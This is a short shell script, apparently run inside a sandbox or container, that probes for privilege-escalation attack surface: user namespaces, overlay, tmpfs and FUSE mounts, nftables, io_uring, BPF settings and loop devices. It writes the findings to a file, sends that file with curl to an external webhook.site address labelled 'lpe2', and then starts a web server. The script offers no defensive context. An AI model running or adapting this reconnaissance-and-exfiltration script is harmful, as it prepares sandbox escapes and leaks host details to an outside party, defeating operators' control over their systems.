out=/www/out.txt; : > $out
echo "==userns==" >> $out; unshare -Ur id >> $out 2>&1
echo "==tmpfs-in-userns==" >> $out; unshare -Urm sh -c 'mkdir -p /tmp/m; mount -t tmpfs none /tmp/m && echo TMPFS_OK || echo TMPFS_FAIL' >> $out 2>&1
echo "==overlay-in-userns==" >> $out; unshare -Urm sh -c 'mkdir -p /tmp/l /tmp/uMen /tmp/u /tmp/w /tmp/o; echo x>/tmp/l/f; mount -t overlay overlay -o lowerdir=/tmp/l,upperdir=/tmp/u,workdir=/tmp/w /tmp/o && echo OVL_OK || echo OVL_FAIL' >> $out 2>&1
echo "==fuse==" >> $out; ls -la /dev/fuse >> $out 2>&1
echo "==fuse-mount==" >> $out; unshare -Urm sh -c 'mkdir -p /tmp/f; mount -t fuse none /tmp/f && echo FUSE_OK || echo FUSE_FAIL' >> $out 2>&1
echo "==nft==" >> $out; unshare -Urn sh -c 'nft add table inet t && echo NFT_OK || echo NFT_FAIL' >> $out 2>&1
echo "==io_uring==" >> $out; cat /proc/sys/kernel/io_uring_disabled >> $out 2>&1
echo "==squashfs-loop==" >> $out; ls -la /dev/loop* >> $out 2>&1
echo "==bpf==" >> $out; cat /proc/sys/kernel/unprivileged_bpf_disabled >> $out 2>&1
echo "DONE" >> $out
curl -sk -m 20 --data-binary @$out "https://webhook.site/1a315c42-31b4-4eab-bb1a-5860736bdeb8/lpe2"
httpd -f -p 80 -h /www
